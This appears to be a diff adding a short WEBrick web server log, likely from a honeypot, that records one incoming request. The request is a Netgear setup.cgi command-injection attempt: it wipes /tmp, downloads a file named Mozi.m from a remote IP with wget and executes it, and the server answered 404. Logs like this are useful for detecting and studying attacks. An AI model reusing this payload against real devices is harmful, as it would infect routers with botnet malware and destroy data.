@@ -1,0 +1,4 @@
+[2019-11-16 00:48:46] INFO  WEBrick 1.4.2
+[2019-11-16 00:48:46] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux-gnu]
+[2019-11-16 00:48:46] INFO  WEBrick::HTTPServer#start: pid=359 port=80
+116.114.95.190 - - [16/Nov/2019:01:03:20 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://114.240.90.197:7001/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 562 0.0509
